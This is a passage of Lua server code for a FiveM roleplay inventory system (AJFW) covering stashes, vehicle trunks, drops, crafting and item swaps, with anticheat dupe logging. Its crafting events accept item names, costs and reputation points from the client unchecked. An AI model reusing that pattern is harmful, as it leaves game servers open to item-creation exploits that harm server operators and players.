						TriggerClientEvent('inventory:client:CheckOpenState', Drops[id].isOpen, name, id, Drops[id].label)
					else
						Drops[id].isOpen = false
					end
				end
			end
			if Drops[id] and not Drops[id].isOpen then
				secondInv.coords = Drops[id].coords
				secondInv.name = id
				secondInv.label = "Dropped-"..tostring(id)
				secondInv.maxweight = 100000
				secondInv.inventory = Drops[id].items
				secondInv.slots = 30
				Drops[id].isOpen = src
				Drops[id].label = secondInv.label
				Drops[id].createdTime = os.time()
			else
				secondInv.name = "none-inv"
				secondInv.label = "Dropped-None"
				secondInv.maxweight = 100000
				secondInv.inventory = {}
				secondInv.slots = 0
			end
		end
		TriggerClientEvent("inventory:client:OpenInventory", src, {}, Player.PlayerData.items, secondInv)
	else
		TriggerClientEvent("inventory:client:OpenInventory", src, {}, Player.PlayerData.items)
	end
end exports('OpenInventory',OpenInventory)

local function CanAddItem(source, item, amount)
    local Player = AJFW.Functions.GetPlayer(source)
    if not Player then return false end
    local itemData = AJFW.Shared.Items[item:lower()]
    if not itemData then return false end
    local weight = itemData.weight * amount
    local totalWeight = GetTotalWeight(Player.PlayerData.items) + weight
    if totalWeight > Config.MaxWeight then
        return false, 'weight'
    end
    local slotsUsed = 0
    for _, v in pairs(Player.PlayerData.items) do
        if v then
            slotsUsed = slotsUsed + 1
        end
    end
    if slotsUsed >= Config.MaxSlots then
        return false, 'slots'
    end
    return true
end exports('CanAddItem', CanAddItem)

function CloseInventory(source, identifier)
    if identifier then
		if Stashes[identifier] then
			Stashes[identifier].isOpen = false
		elseif Trunks[identifier] then
			Trunks[identifier].isOpen = false
		elseif Gloveboxes[identifier] then
			Gloveboxes[identifier].isOpen = false
		elseif Drops[identifier] then
			Drops[identifier].isOpen = false
		end
    end
    TriggerClientEvent('aj-inventory:client:closeInv', source)
end exports('CloseInventory', CloseInventory)

-- function OpenInventoryById(source, targetId)
--     local QBPlayer = AJFW.Functions.GetPlayer(source)
--     local TargetPlayer = AJFW.Functions.GetPlayer(targetId)
--     if not QBPlayer or not TargetPlayer then return end
--     if Player(targetId).state.inv_busy then CloseInventory(targetId) end
--     local playerItems = QBPlayer.PlayerData.items
--     local targetItems = TargetPlayer.PlayerData.items
--     local formattedInventory = {
--         name = 'otherplayer-' .. targetId,
--         label = GetPlayerName(targetId),
--         maxweight = Config.MaxWeight,
--         slots = Config.MaxSlots,
--         inventory = targetItems
--     }
--     Wait(1500)
--     Player(targetId).state.inv_busy = true
--     TriggerClientEvent('aj-inventory:client:openInventory', source, playerItems, formattedInventory)
-- end

-- exports('OpenInventoryById', OpenInventoryById)

AddEventHandler('AJFW:Server:PlayerLoaded', function(Player)
	AJFW.Functions.AddPlayerMethod(Player.PlayerData.source, "AddItem", function(item, amount, slot, info, forceUpdate, created, metadata, decay)
		return AddItem(Player.PlayerData.source, item, amount, slot, info, true, created, metadata, decay)
	end)

	AJFW.Functions.AddPlayerMethod(Player.PlayerData.source, "RemoveItem", function(item, amount, slot, forceUpdate)
		return RemoveItem(Player.PlayerData.source, item, amount, slot, true)
	end)

	AJFW.Functions.AddPlayerMethod(Player.PlayerData.source, "GetItemBySlot", function(slot)
		return GetItemBySlot(Player.PlayerData.source, slot)
	end)

	AJFW.Functions.AddPlayerMethod(Player.PlayerData.source, "GetItemByName", function(item)
		return GetItemByName(Player.PlayerData.source, item)
	end)

	AJFW.Functions.AddPlayerMethod(Player.PlayerData.source, "GetItemsByName", function(item)
		return GetItemsByName(Player.PlayerData.source, item)
	end)

	AJFW.Functions.AddPlayerMethod(Player.PlayerData.source, "ClearInventory", function(filterItems)
		ClearInventory(Player.PlayerData.source, filterItems)
	end)

	AJFW.Functions.AddPlayerMethod(Player.PlayerData.source, "SetInventory", function(items)
		SetInventory(Player.PlayerData.source, items)
	end)
end)

-- AddEventHandler('onResourceStart', function(r) if GetCurrentResourceName() ~= r then return end
	local Players = AJFW.Functions.GetAJPlayers()
	for k in pairs(Players) do
		AJFW.Functions.AddPlayerMethod(k, "AddItem", function(item, amount, slot, info, f, created, metadata, decay)
			return AddItem(k, item, amount, slot, info, true, created, metadata, decay)
		end)

		AJFW.Functions.AddPlayerMethod(k, "RemoveItem", function(item, amount, slot)
			return RemoveItem(k, item, amount, slot, true)
		end)

		AJFW.Functions.AddPlayerMethod(k, "GetItemBySlot", function(slot)
			return GetItemBySlot(k, slot)
		end)

		AJFW.Functions.AddPlayerMethod(k, "GetItemByName", function(item)
			return GetItemByName(k, item)
		end)

		AJFW.Functions.AddPlayerMethod(k, "GetItemsByName", function(item)
			return GetItemsByName(k, item)
		end)

		AJFW.Functions.AddPlayerMethod(k, "ClearInventory", function(filterItems)
			ClearInventory(k, filterItems)
		end)

		AJFW.Functions.AddPlayerMethod(k, "SetInventory", function(items)
			SetInventory(k, items)
		end)
	end
-- end)

RegisterNetEvent('AJFW:Server:UpdateObject', function()
    if source ~= '' then return end -- Safety check if the event was not called from the server.
    AJFW = exports['aj-base']:GetCoreObject()
end)

function addTrunkItems(plate, items)
	Trunks[plate] = {}
	Trunks[plate].items = items
end exports('addTrunkItems',addTrunkItems)

function addGloveboxItems(plate, items)
	Gloveboxes[plate] = {}
	Gloveboxes[plate].items = items
end exports('addGloveboxItems',addGloveboxItems)

RegisterNetEvent('inventory:server:combineItem', function(item, fromItem, toItem)
	local src = source

	-- Check that inputs are not nil
	-- Most commonly when abusing this exploit, this values are left as
	if fromItem == nil  then return end
	if toItem == nil then return end

	-- Check that they have the items
	fromItem = GetItemByName(src, fromItem)
	toItem = GetItemByName(src, toItem)

	if fromItem == nil  then return end
	if toItem == nil then return end

	-- Check the recipe is valid
	local recipe = AJFW.Shared.Items[toItem.name].combinable

	if recipe and recipe.reward ~= item then return end
	if not recipeContains(recipe, fromItem) then return end

	TriggerClientEvent('inventory:client:ItemBox', src, AJFW.Shared.Items[item], 'add')
	AddItem(src, item, 1)
	RemoveItem(src, fromItem.name, 1)
	RemoveItem(src, toItem.name, 1)
end)

RegisterNetEvent('inventory:server:CraftItems', function(itemName, itemCosts, amount, toSlot, points)
	local src = source
	local Player = AJFW.Functions.GetPlayer(src)

	amount = tonumber(amount)

	if not itemName or not itemCosts then return end

	for k, v in pairs(itemCosts) do
		RemoveItem(src, k, (v*amount))
	end
	AddItem(src, itemName, amount, toSlot)
	Player.Functions.SetMetaData("craftingrep", Player.PlayerData.metadata["craftingrep"] + (points * amount))
	TriggerClientEvent("inventory:client:UpdatePlayerInventory", src, false)
end)

RegisterNetEvent('inventory:server:CraftAttachment', function(itemName, itemCosts, amount, toSlot, points)
	local src = source
	local Player = AJFW.Functions.GetPlayer(src)

	amount = tonumber(amount)

	if not itemName or not itemCosts then return end

	for k, v in pairs(itemCosts) do
		RemoveItem(src, k, (v*amount))
	end
	AddItem(src, itemName, amount, toSlot)
	Player.Functions.SetMetaData("attachmentcraftingrep", Player.PlayerData.metadata["attachmentcraftingrep"] + (points * amount))
	TriggerClientEvent("inventory:client:UpdatePlayerInventory", src, false)
end)

RegisterNetEvent('inventory:server:SetIsOpenState', function(IsOpen, type, id)
	if IsOpen then return end

	if type == "stash" then
		Stashes[id].isOpen = false
	elseif type == "trunk" then
		Trunks[id].isOpen = false
	elseif type == "glovebox" then
		Gloveboxes[id].isOpen = false
	elseif type == "drop" then
		Drops[id].isOpen = false
	end
end)

RegisterNetEvent('inventory:server:OpenInventory', function(name, id, other)
	local src = source
	if InventoryOpen[src] then
		return AJFW.Functions.Notify(src, 'Player ID:'..InventoryOpen[src]..' Have hands in your pocket', 'error')
	end
	local ply = Player(src)
	local Player = AJFW.Functions.GetPlayer(src)
	if ply.state.inv_busy then
		return AJFW.Functions.Notify(src, Lang:t("notify.noaccess"), 'error')
	end
	if name and id then
		local secondInv = {}
		if name == "stash" then
			if Stashes[id] then
				if Stashes[id].isOpen then
					local Target = AJFW.Functions.GetPlayer(Stashes[id].isOpen)
					if Target then
						TriggerClientEvent('inventory:client:CheckOpenState', Stashes[id].isOpen, name, id, Stashes[id].label)
					else
						Stashes[id].isOpen = false
					end
				end
			end
			local maxweight = 1000000
			local slots = 50
			if other then
				maxweight = other.maxweight or 1000000
				slots = other.slots or 50
			end
			secondInv.name = "stash-"..id
			secondInv.label = "Stash-"..id
			secondInv.maxweight = maxweight
			secondInv.inventory = {}
			secondInv.slots = slots
			if Stashes[id] and Stashes[id].isOpen then
				secondInv.name = "none-inv"
				secondInv.label = "Stash-None"
				secondInv.maxweight = 1000000
				secondInv.inventory = {}
				secondInv.slots = 0
			else
				local stashItems = GetStashItems(id)
				if next(stashItems) then
					secondInv.inventory = stashItems
					Stashes[id] = {}
					Stashes[id].items = stashItems
					Stashes[id].isOpen = src
					Stashes[id].label = secondInv.label
				else
					Stashes[id] = {}
					Stashes[id].items = {}
					Stashes[id].isOpen = src
					Stashes[id].label = secondInv.label
				end
			end
		elseif name == "trunk" then
			if Trunks[id] then
				if Trunks[id].isOpen then
					local Target = AJFW.Functions.GetPlayer(Trunks[id].isOpen)
					if Target then
						TriggerClientEvent('inventory:client:CheckOpenState', Trunks[id].isOpen, name, id, Trunks[id].label)
					else
						Trunks[id].isOpen = false
					end
				end
			end
			secondInv.name = "trunk-"..id
			secondInv.label = "Trunk-"..id
			secondInv.maxweight = other.maxweight or 60000
			secondInv.inventory = {}
			secondInv.slots = other.slots or 50
			if (Trunks[id] and Trunks[id].isOpen) or (AJFW.Shared.SplitStr(id, "PLZI")[2] and (Player.PlayerData.job.name ~= "police" or Player.PlayerData.job.type ~= "leo")) then
				secondInv.name = "none-inv"
				secondInv.label = "Trunk-None"
				secondInv.maxweight = other.maxweight or 60000
				secondInv.inventory = {}
				secondInv.slots = 0
			else
				if id then
					local ownedItems = GetOwnedVehicleItems(id)
					if Trunks[id] and not Trunks[id].isOpen then
						secondInv.inventory = Trunks[id].items
						Trunks[id].isOpen = src
						Trunks[id].label = secondInv.label
					elseif IsVehicleOwned(id) and next(ownedItems) then
						secondInv.inventory = ownedItems
						Trunks[id] = {}
						Trunks[id].items = ownedItems
						Trunks[id].isOpen = src
						Trunks[id].label = secondInv.label
					elseif Trunks[id] and not Trunks[id].isOpen then
						secondInv.inventory = Trunks[id].items
						Trunks[id].isOpen = src
						Trunks[id].label = secondInv.label
					else
						Trunks[id] = {}
						Trunks[id].items = {}
						Trunks[id].isOpen = src
						Trunks[id].label = secondInv.label
					end
				end
			end
		elseif name == "glovebox" then
			if Gloveboxes[id] then
				if Gloveboxes[id].isOpen then
					local Target = AJFW.Functions.GetPlayer(Gloveboxes[id].isOpen)
					if Target then
						TriggerClientEvent('inventory:client:CheckOpenState', Gloveboxes[id].isOpen, name, id, Gloveboxes[id].label)
					else
						Gloveboxes[id].isOpen = false
					end
				end
			end
			secondInv.name = "glovebox-"..id
			secondInv.label = "Glovebox-"..id
			secondInv.maxweight = 10000
			secondInv.inventory = {}
			secondInv.slots = 5
			if Gloveboxes[id] and Gloveboxes[id].isOpen then
				secondInv.name = "none-inv"
				secondInv.label = "Glovebox-None"
				secondInv.maxweight = 10000
				secondInv.inventory = {}
				secondInv.slots = 0
			else
				local ownedItems = GetOwnedVehicleGloveboxItems(id)
				if Gloveboxes[id] and not Gloveboxes[id].isOpen then
					secondInv.inventory = Gloveboxes[id].items
					Gloveboxes[id].isOpen = src
					Gloveboxes[id].label = secondInv.label
				elseif IsVehicleOwned(id) and next(ownedItems) then
					secondInv.inventory = ownedItems
					Gloveboxes[id] = {}
					Gloveboxes[id].items = ownedItems
					Gloveboxes[id].isOpen = src
					Gloveboxes[id].label = secondInv.label
				else
					Gloveboxes[id] = {}
					Gloveboxes[id].items = {}
					Gloveboxes[id].isOpen = src
					Gloveboxes[id].label = secondInv.label
				end
			end
		elseif name == "shop" then
			secondInv.name = "itemshop-"..id
			secondInv.label = other.label
			secondInv.maxweight = 900000
			secondInv.inventory = SetupShopItems(other.items)
			ShopItems[id] = {}
			ShopItems[id].items = other.items
			secondInv.slots = #other.items
		elseif name == "traphouse" then
			secondInv.name = "traphouse-"..id
			secondInv.label = other.label
			secondInv.maxweight = 900000
			secondInv.inventory = other.items
			secondInv.slots = other.slots
		elseif name == "crafting" then
			secondInv.name = "crafting"
			secondInv.label = other.label
			secondInv.maxweight = 900000
			secondInv.inventory = other.items
			secondInv.slots = #other.items
		elseif name == "attachment_crafting" then
			secondInv.name = "attachment_crafting"
			secondInv.label = other.label
			secondInv.maxweight = 900000
			secondInv.inventory = other.items
			secondInv.slots = #other.items
		elseif name == "otherplayer" then
			if InventoryOpen[tonumber(id)] then
				return AJFW.Functions.Notify(src, 'Player ID:'..InventoryOpen[tonumber(id)]..' Already have hands in same pocket', 'error')
			end
			if not InventoryOpen[tonumber(id)] then
				InventoryOpen[tonumber(id)] = src
				TriggerClientEvent("aj-inventory:client:closeinv", tonumber(id))
			end
			local OtherPlayer = AJFW.Functions.GetPlayer(tonumber(id))
			if OtherPlayer then
				secondInv.name = "otherplayer-"..id
				secondInv.label = "Player-"..id
				secondInv.maxweight = Config.MaxInventoryWeight
				secondInv.inventory = OtherPlayer.PlayerData.items
				if (Player.PlayerData.job.name == "police" or Player.PlayerData.job.type == "leo") and Player.PlayerData.job.onduty then
					secondInv.slots = Config.MaxInventorySlots
				else
					secondInv.slots = Config.MaxInventorySlots - 1
				end
				Wait(250)
			end
		else
			if Drops[id] then
				if Drops[id].isOpen then
					local Target = AJFW.Functions.GetPlayer(Drops[id].isOpen)
					if Target then
						TriggerClientEvent('inventory:client:CheckOpenState', Drops[id].isOpen, name, id, Drops[id].label)
					else
						Drops[id].isOpen = false
					end
				end
			end
			if Drops[id] and not Drops[id].isOpen then
				secondInv.coords = Drops[id].coords
				secondInv.name = id
				secondInv.label = "Dropped-"..tostring(id)
				secondInv.maxweight = 100000
				secondInv.inventory = Drops[id].items
				secondInv.slots = 30
				Drops[id].isOpen = src
				Drops[id].label = secondInv.label
				Drops[id].createdTime = os.time()
			else
				secondInv.name = "none-inv"
				secondInv.label = "Dropped-None"
				secondInv.maxweight = 100000
				secondInv.inventory = {}
				secondInv.slots = 0
			end
		end
		TriggerClientEvent("inventory:client:OpenInventory", src, {}, Player.PlayerData.items, secondInv)
	else
		TriggerClientEvent("inventory:client:OpenInventory", src, {}, Player.PlayerData.items)
	end
end)

RegisterNetEvent('inventory:server:SaveInventory', function(type, id)
	if type == "trunk" then
		if IsVehicleOwned(id) then
			SaveOwnedVehicleItems(id, Trunks[id].items)
		else
			Trunks[id].isOpen = false
		end
	elseif type == "glovebox" then
		if (IsVehicleOwned(id)) then
			SaveOwnedGloveboxItems(id, Gloveboxes[id].items)
		else
			Gloveboxes[id].isOpen = false
		end
	elseif type == "stash" then
		SaveStashItems(id, Stashes[id].items)
	elseif type == "drop" then
		if Drops[id] then
			Drops[id].isOpen = false
			if Drops[id].items == nil or next(Drops[id].items) == nil then
				Drops[id] = nil
				TriggerClientEvent("inventory:client:RemoveDropItem", -1, id)
			end
		end
	end
end)

RegisterNetEvent('inventory:server:UseItemSlot', function(slot)
	local src = source
	local Player = AJFW.Functions.GetPlayer(src)
	local itemData = Player.Functions.GetItemBySlot(slot)
	if itemData then
		local itemInfo = AJFW.Shared.Items[itemData.name]
		if itemData.type == "weapon" then
			if itemData.info.quality then
				if itemData.info.quality > 0 then
					TriggerClientEvent("inventory:client:UseWeapon", src, itemData, true)
				else
					TriggerClientEvent("inventory:client:UseWeapon", src, itemData, false)
				end
			else
				TriggerClientEvent("inventory:client:UseWeapon", src, itemData, true)
			end
			TriggerClientEvent('inventory:client:ItemBox', src, itemInfo, "use")
		elseif itemData.useable then
			if itemData.info.quality then
				if itemData.info.quality > 0 then
					UseItem(itemData.name, src, itemData)
					TriggerClientEvent('inventory:client:ItemBox', src, itemInfo, "use")
				else
					if itemInfo['delete'] and RemoveItem(src,itemData.name,1,slot, true) then
						TriggerClientEvent('inventory:client:ItemBox',src, itemInfo, "remove")
					else
						TriggerClientEvent("AJFW:Notify", src, "You can't use this item", "error")
					end
				end
			else
				UseItem(itemData.name, src, itemData)
				TriggerClientEvent('inventory:client:ItemBox', src, itemInfo, "use")
			end
		end
	end
end)

RegisterNetEvent('inventory:server:UseItem', function(inventory, item)
	local src = source
	local Player = AJFW.Functions.GetPlayer(src)
	if inventory == "player" or inventory == "hotbar" then
		local itemData = Player.Functions.GetItemBySlot(item.slot)
		if itemData then
			local itemInfo = AJFW.Shared.Items[itemData.name]
			if itemData.type ~= "weapon" then
				if itemData.info.quality then
					if itemData.info.quality <= 0 then
						if itemInfo['delete'] and RemoveItem(src,itemData.name,1,item.slot, true) then
							TriggerClientEvent("AJFW:Notify", src, "You can't use this item", "error")
							TriggerClientEvent('inventory:client:ItemBox',src, itemInfo, "remove")
							return
						else
							TriggerClientEvent("AJFW:Notify", src, "You can't use this item", "error")
							return
						end
					end
				end
			end
			UseItem(itemData.name, src, itemData)
			TriggerClientEvent('inventory:client:ItemBox', src, itemInfo, "use")
		end
	end
end)


RegisterNetEvent('inventory:server:SetInventoryData', function(fromInventory, toInventory, fromSlot, toSlot, fromAmount, toAmount)
    local src = source
    local Player = AJFW.Functions.GetPlayer(src)
    fromSlot = tonumber(fromSlot)
    toSlot = tonumber(toSlot)

    if (fromInventory == "player" or fromInventory == "hotbar") and (AJFW.Shared.SplitStr(toInventory, "-")[1] == "itemshop" or toInventory == "crafting") then
        return
    end

    if fromInventory == "player" or fromInventory == "hotbar" then
        local fromItemData = GetItemBySlot(src, fromSlot)
        fromAmount = tonumber(fromAmount) or fromItemData.amount
        if fromItemData and fromItemData.amount >= fromAmount then
            if toInventory == "player" or toInventory == "hotbar" then
                local toItemData = GetItemBySlot(src, toSlot)
				local HardStoreData = deep_copy(fromItemData)
				local HardStoreData2 = deep_copy(toItemData)
                RemoveItem(src, fromItemData.name, fromAmount, fromSlot)
                TriggerClientEvent("inventory:client:CheckWeapon", src, fromItemData.name)
                if toItemData ~= nil then
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                        RemoveItem(src, toItemData.name, toAmount, toSlot)
						AddItem(src, toItemData.name, toAmount, fromSlot, HardStoreData2.info, true, toItemData["created"], HardStoreData2["metadata"], HardStoreData2["decay"])
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..toItemData.name.."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount.. "**")
                    end
                end
				-- why
                AddItem(src, fromItemData.name, fromAmount, toSlot, HardStoreData.info, true, fromItemData["created"], HardStoreData['metadata'], HardStoreData['decay'])
            elseif AJFW.Shared.SplitStr(toInventory, "-")[1] == "otherplayer" then
                local playerId = tonumber(AJFW.Shared.SplitStr(toInventory, "-")[2])
                local OtherPlayer = AJFW.Functions.GetPlayer(playerId)
                local toItemData = OtherPlayer.PlayerData.items[toSlot]
                local itemDataTest = OtherPlayer.Functions.GetItemBySlot(toSlot)
				local HardStoreData = deep_copy(fromItemData)
				local HardStoreData2 = deep_copy(itemDataTest)
                RemoveItem(src, fromItemData.name, fromAmount, fromSlot, true)
                TriggerClientEvent("inventory:client:CheckWeapon", src, fromItemData.name)
                if toItemData ~= nil then
                    local itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if itemDataTest.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            OtherPlayer.Functions.RemoveItem(itemInfo["name"], toAmount, toSlot, true)
                            Player.Functions.AddItem(toItemData.name, toAmount, fromSlot, HardStoreData2.info, true, HardStoreData2.created, HardStoreData2.metadata, HardStoreData2['decay'])
                            TriggerEvent("aj-log:server:CreateLog", "robbing", "Swapped Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount.. "** with player: **".. GetPlayerName(OtherPlayer.PlayerData.source) .. "** (citizenid: *"..OtherPlayer.PlayerData.citizenid.."* | id: *"..OtherPlayer.PlayerData.source.."*)")
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount.. "** with player: **".. GetPlayerName(OtherPlayer.PlayerData.source) .. "** (citizenid: *"..OtherPlayer.PlayerData.citizenid.."* | id: *"..OtherPlayer.PlayerData.source.."*)")
                    end
                else
                    local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                    TriggerEvent("aj-log:server:CreateLog", "robbing", "Dropped Item", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) dropped new item; name: **"..itemInfo["name"].."**, amount: **" .. fromAmount .. "** to player: **".. GetPlayerName(OtherPlayer.PlayerData.source) .. "** (citizenid: *"..OtherPlayer.PlayerData.citizenid.."* | id: *"..OtherPlayer.PlayerData.source.."*)")
                end
                local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                AddItem(playerId, itemInfo["name"], fromAmount, toSlot, HardStoreData.info, true, HardStoreData.created, HardStoreData["metadata"], HardStoreData['decay'])
				OtherPlayer = AJFW.Functions.GetPlayer(playerId)
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, OtherPlayer.PlayerData.items)
			elseif AJFW.Shared.SplitStr(toInventory, "-")[1] == "trunk" then
                local plate = AJFW.Shared.SplitStr(toInventory, "-")[2]
                local toItemData = Trunks[plate].items[toSlot]
				local HardStoreData = deep_copy(fromItemData)
				local HardStoreData2 = deep_copy(toItemData)
                RemoveItem(src, fromItemData.name, fromAmount, fromSlot, true)
                TriggerClientEvent("inventory:client:CheckWeapon", src, fromItemData.name)
                if toItemData ~= nil then
                    local itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            RemoveFromTrunk(plate, fromSlot, itemInfo["name"], toAmount)
                            Player.Functions.AddItem(toItemData.name, toAmount, fromSlot, HardStoreData2.info, true, HardStoreData.created, HardStoreData2.metadata, HardStoreData2['decay'])
                            TriggerEvent("aj-log:server:CreateLog", "trunk", "Swapped Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) swapped item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount .. "** - plate: *" .. plate .. "*")
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount.. "** - plate: *" .. plate .. "*")
                    end
                else
                    local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                    TriggerEvent("aj-log:server:CreateLog", "trunk", "Dropped Item", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) dropped new item; name: **"..itemInfo["name"].."**, amount: **" .. fromAmount .. "** - plate: *" .. plate .. "*")
                end
                local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                AddToTrunk(plate, toSlot, fromSlot, itemInfo["name"], fromAmount, HardStoreData.info, itemInfo["created"], HardStoreData.metadata, HardStoreData['decay'])
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, Trunks[plate].items)
			elseif AJFW.Shared.SplitStr(toInventory, "-")[1] == "glovebox" then
                local plate = AJFW.Shared.SplitStr(toInventory, "-")[2]
                local toItemData = Gloveboxes[plate].items[toSlot]
				local HardStoreData = deep_copy(fromItemData)
				local HardStoreData2 = deep_copy(toItemData)
				RemoveItem(src, fromItemData.name, fromAmount, fromSlot, true)
                TriggerClientEvent("inventory:client:CheckWeapon", src, fromItemData.name)
                if toItemData ~= nil then
                    local itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            RemoveFromGlovebox(plate, fromSlot, itemInfo["name"], toAmount)
                            Player.Functions.AddItem(toItemData.name, toAmount, fromSlot, HardStoreData2.info, true, HardStoreData2.created, HardStoreData2.metadata, HardStoreData2['decay'])
                            TriggerEvent("aj-log:server:CreateLog", "glovebox", "Swapped Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) swapped item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount .. "** - plate: *" .. plate .. "*")
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount.. "** - plate: *" .. plate .. "*")
                    end
                else
                    local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                    TriggerEvent("aj-log:server:CreateLog", "glovebox", "Dropped Item", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) dropped new item; name: **"..itemInfo["name"].."**, amount: **" .. fromAmount .. "** - plate: *" .. plate .. "*")
                end
                local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                AddToGlovebox(plate, toSlot, fromSlot, itemInfo["name"], fromAmount, HardStoreData.info, itemInfo["created"], HardStoreData.metadata, HardStoreData['decay'])
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, Gloveboxes[plate].items)
			elseif AJFW.Shared.SplitStr(toInventory, "-")[1] == "stash" then
                local stashId = AJFW.Shared.SplitStr(toInventory, "-")[2]
                local toItemData = Stashes[stashId].items[toSlot]
				local HardStoreData = deep_copy(fromItemData)
				local HardStoreData2 = deep_copy(toItemData)
                RemoveItem(src, fromItemData.name, fromAmount, fromSlot, true)
                TriggerClientEvent("inventory:client:CheckWeapon", src, fromItemData.name)
                if toItemData ~= nil then
                    local itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                    local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                    if toItemData.amount >= toAmount then
                        if toItemData.name ~= fromItemData.name then
                            RemoveFromStash(stashId, toSlot, itemInfo["name"], toAmount)
                            Player.Functions.AddItem(toItemData.name, toAmount, fromSlot, HardStoreData2.info, true, HardStoreData2.created, HardStoreData2.metadata, HardStoreData2['decay'])
                            TriggerEvent("aj-log:server:CreateLog", "stash", "Swapped Item", "orange", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) swapped item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount .. "** - stash: *" .. stashId .. "*")
                        end
                    else
                        TriggerEvent("aj-log:server:CreateLog", "anticheat", "Dupe log", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | *"..src.."*) swapped item; name: **"..itemInfo["name"].."**, amount: **" .. toAmount .. "** with name: **" .. fromItemData.name .. "**, amount: **" .. fromAmount.. "** - stash: *" .. stashId .. "*")
                    end
                else
                    local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                    TriggerEvent("aj-log:server:CreateLog", "stash", "Dropped Item", "red", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) dropped new item; name: **"..itemInfo["name"].."**, amount: **" .. fromAmount .. "** - stash: *" .. stashId .. "*")
                end
                local itemInfo = AJFW.Shared.Items[fromItemData.name:lower()]
                AddToStash(stashId, toSlot, fromSlot, itemInfo["name"], fromAmount, HardStoreData.info, itemInfo["created"], HardStoreData.metadata, HardStoreData['decay'])
				TriggerClientEvent('inventory:client:UpdateOtherInventory2', src, Stashes[stashId].items)
            else
                -- drop
                toInventory = tonumber(toInventory)
                if toInventory == nil or toInventory == 0 then
					local HardStoreData = deep_copy(fromItemData)
					CreateNewDrop(src, fromSlot, toSlot, fromAmount, HardStoreData.created, HardStoreData.metadata, HardStoreData['decay'])
                else
                    local toItemData = Drops[toInventory].items[toSlot]
					local HardStoreData = deep_copy(fromItemData)
					local HardStoreData2 = deep_copy(toItemData)
                    RemoveItem(src, fromItemData.name, fromAmount, fromSlot, true)
                    TriggerClientEvent("inventory:client:CheckWeapon", src, fromItemData.name)
                    if toItemData ~= nil then
                        local itemInfo = AJFW.Shared.Items[toItemData.name:lower()]
                        local toAmount = tonumber(toAmount) ~= nil and tonumber(toAmount) or toItemData.amount
                        if toItemData.amount >= toAmount then
                            if toItemData.name ~= fromItemData.name then
                                Player.Functions.AddItem(toItemData.name, toAmount, fromSlot, HardStoreData2.info, true, HardStoreData2.created, HardStoreData2.metadata, HardStoreData2['decay'])
                                RemoveFromDrop(toInventory, fromSlot, itemInfo["name"], toAmount)
